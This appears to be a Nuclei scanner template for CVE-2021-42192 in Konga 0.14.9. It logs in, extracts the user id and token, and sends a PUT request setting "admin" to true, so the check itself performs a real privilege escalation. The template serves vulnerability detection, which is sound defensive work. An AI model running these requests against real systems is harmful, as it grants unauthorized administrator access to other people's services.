http:
- extractors:
  - group: 1
    internal: true
    name: id
    part: body
    regex:
    - '"id":([0-9]+)'
    type: regex
  - group: 1
    internal: true
    name: token
    part: body
    regex:
    - '"token":"(.*)"'
    type: regex
  matchers:
  - condition: and
    dsl:
    - contains(body_2, "\"admin\":false")
    - contains(body_3, "\"admin\":true")
    type: dsl
  - part: header
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /login HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"password": "{{password}}", "identifier": "{{username}}"}

    '
  - 'POST /api/user/{{id}} HTTP/1.1

    Host: {{Hostname}}

    Origin: {{BaseURL}}

    Referer: {{BaseURL}}

    Content-Type: application/json;charset=utf-8


    {"token": "{{token}}"}

    '
  - 'PUT /api/user/{{id}} HTTP/1.1

    Host: {{Hostname}}

    Origin: {{BaseURL}}

    Referer: {{BaseURL}}

    Content-Type: application/json;charset=utf-8


    {"admin": "true", "passports": {"password": "{{password}}", "protocol": "local"},
    "token": "{{token}}", "password_confirmation": "{{password}}"}

    '
id: CVE-2021-42192
info:
  author: rschio
  classification:
    cpe: cpe:2.3:a:konga_project:konga:0.14.9:*:*:*:*:*:*:*
    cve-id: CVE-2021-42192
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cwe-id: CWE-863
    epss-percentile: 0.9602
    epss-score: 0.25419
  description: KONGA 0.14.9 allows attackers to set higher privilege users to full
    administration access. The attack vector is a crafted condition, as demonstrated
    by the /api/user/{ID} at ADMIN parameter.
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    escalate their privileges and gain unauthorized access to sensitive information
    or perform unauthorized actions.

    '
  metadata:
    max-request: 3
    product: konga
    vendor: konga_project
  name: KONGA 0.14.9 - Privilege Escalation
  reference:
  - http://n0hat.blogspot.com/2021/11/konga-0149-privilege-escalation-exploit.html
  - https://www.exploit-db.com/exploits/50521
  - hhttps://nvd.nist.gov/vuln/detail/CVE-2021-42192
  - https://docs.google.com/document/d/1-YU9zWiDVUps3Mb6zos3996yvZ48vW_vfOvaJLLHc4I/edit?usp=sharing
  - https://github.com/pantsel/konga/
  remediation: 'Upgrade to a patched version of KONGA or apply the necessary security
    patches provided by the vendor.

    '
  severity: high
  tags: cve2021,cve,authenticated,edb,konga,intrusive,konga_project,vuln
